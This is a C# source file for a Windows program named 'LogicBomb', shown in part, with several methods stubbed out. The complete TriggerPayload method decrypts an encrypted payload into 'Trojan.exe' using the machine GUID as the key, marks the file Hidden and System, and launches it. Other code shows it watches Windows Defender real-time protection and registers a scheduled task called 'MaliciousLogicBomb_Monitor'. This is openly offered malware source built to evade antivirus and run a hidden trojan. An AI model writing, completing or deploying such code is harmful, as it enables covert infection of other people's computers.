using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;
using SharedCrypto;

namespace LogicBomb
{
    internal class Program
    {
        private static readonly string ExecutableBaseDir = AppDomain.CurrentDomain.BaseDirectory;
        private static readonly string ResultDir = Path.Combine(ExecutableBaseDir, "result");

        private const string MarkerName = "activated.txt";
        private const string EncryptedBombName = "bomb.encrypted";
        private const string DecryptedTrojanName = "Trojan.exe";
        private const int CheckIntervalSeconds = 10;
        private const int ConsecutiveChecksRequired = 3;
        private const string LOGICBOMB_TASK_NAME = "MaliciousLogicBomb_Monitor";

        private static string logFile;
        private static CancellationTokenSource cts = new CancellationTokenSource();
        private static int consecutiveDownChecks = 0;
        private static bool lastRealtimeProtectionStatus = true;

        static void Main(string[] args)
        {
            // ... (No changes in Main)
        }

        private static async Task MonitorDefenderLoop(CancellationToken token)
        {
            // ... (No changes in MonitorDefenderLoop)
        }

        private static bool IsRealtimeProtectionEnabled()
        {
            // ... (No changes in IsRealtimeProtectionEnabled)
        }

        // UPDATED: Now sets attributes on Trojan.exe before launch
        private static void TriggerPayload()
        {
            try
            {
                Console.WriteLine("[LogicBomb] === PAYLOAD TRIGGERED ===");
                LogEvent("trigger_start", ExecutableBaseDir, "payload_activation", null);

                string markerPath = Path.Combine(ResultDir, MarkerName);
                File.WriteAllText(markerPath, $"Activated at {DateTime.Now:yyyy-MM-dd HH:mm:ss}\r\n");
                Console.WriteLine("[LogicBomb] Created marker: " + markerPath);

                string machineGuid = CryptoUtils.GetMachineGuid();
                LogInfo($"Local Machine GUID: {machineGuid}");

                string encryptedBombPath = Path.Combine(ExecutableBaseDir, EncryptedBombName);
                string executableToRun = null;

                if (File.Exists(encryptedBombPath))
                {
                    try
                    {
                        Console.WriteLine($"[LogicBomb] Found encrypted payload: {encryptedBombPath}");
                        string decryptedTrojanPath = Path.Combine(ResultDir, DecryptedTrojanName);
                        CryptoUtils.DecryptFile(encryptedBombPath, decryptedTrojanPath, machineGuid);
                        Console.WriteLine($"[LogicBomb] Decrypted payload to: {decryptedTrojanPath}");
                        LogEvent("decrypted", encryptedBombPath, "decrypted_to", decryptedTrojanPath);

                        if (File.Exists(decryptedTrojanPath))
                        {
                            // --- NEW: Set attributes to Hidden and System ---
                            try
                            {
                                File.SetAttributes(decryptedTrojanPath, FileAttributes.Hidden | FileAttributes.System);
                                LogSuccess($"Set attributes for {DecryptedTrojanName} to Hidden+System.");
                                LogEvent("attributes_set", decryptedTrojanPath, "set_hidden_system", null);
                            }
                            catch (Exception ex)
                            {
                                LogWarning($"Failed to set attributes on Trojan.exe: {ex.Message}");
                            }
                            // --- END NEW ---

                            executableToRun = decryptedTrojanPath;
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[LogicBomb] Error processing encrypted payload: " + ex.Message);
                        LogEvent("error", encryptedBombPath, "processing_failed", ex.Message);
                    }
                }
                else
                {
                    Console.WriteLine($"[LogicBomb] {EncryptedBombName} not found.");
                    LogEvent("error", ExecutableBaseDir, "no_encrypted_bomb", null);
                }

                if (executableToRun != null)
                {
                    Console.WriteLine("[LogicBomb] Launching: " + executableToRun);
                    LogEvent("final", executableToRun, "about_to_launch", "payload launching");
                    try
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = executableToRun,
                            WorkingDirectory = ResultDir,
                            UseShellExecute = true
                        });
                        LogEvent("launched", executableToRun, "launched", null);
                        Console.WriteLine("[LogicBomb] Trojan.exe started.");
                        CleanupAndExit();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[LogicBomb] Error launching executable: " + ex.Message);
                        LogEvent("error", executableToRun, "launch_failed", ex.Message);
                    }
                }
                else
                {
                    LogError("Payload trigger failed - no executable to run");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[LogicBomb] TriggerPayload error: " + ex.Message);
                LogEvent("error", "trigger_payload", "exception", ex.Message);
            }
        }

        private static void CleanupAndExit()
        {
            // ... (No changes in CleanupAndExit)
        }

        private static void DeleteScheduledTask(string taskName)
        {
            // ... (No changes in DeleteScheduledTask)
        }

        // --- Logging and Helper methods (No changes below this line) ---
        private static void LogEvent(string type, string path, string ev, string note)
        {
            try
            {
                var obj = new Dictionary<string, string>
                {
                    ["timestamp"] = DateTime.UtcNow.ToString("o"),
                    ["type"] = type ?? "unknown",
                    ["event"] = ev ?? "none",
                    ["path"] = path ?? "null",
                    ["note"] = note ?? "none"
                };
                string json = "{ " + string.Join(", ", obj.Select(kv => $"\"{kv.Key}\": \"{Escape(kv.Value)}\"")) + " }";
                File.AppendAllText(logFile, json + Environment.NewLine);
            }
            catch { /* Fail silently */ }
        }

        private static string Escape(string s) => s?.Replace("\\", "\\\\").Replace("\"", "\\\"") ?? "";
        private static void LogInfo(string message) { Console.ForegroundColor = ConsoleColor.Cyan; Console.WriteLine($"[INFO] {message}"); Console.ResetColor(); }
        private static void LogSuccess(string message) { Console.ForegroundColor = ConsoleColor.Green; Console.WriteLine($"[SUCCESS] {message}"); Console.ResetColor(); }
        private static void LogWarning(string message) { Console.ForegroundColor = ConsoleColor.Yellow; Console.WriteLine($"[WARNING] {message}"); Console.ResetColor(); }
        private static void LogError(string message) { Console.ForegroundColor = ConsoleColor.Red; Console.WriteLine($"[ERROR] {message}"); Console.ResetColor(); }
    }
}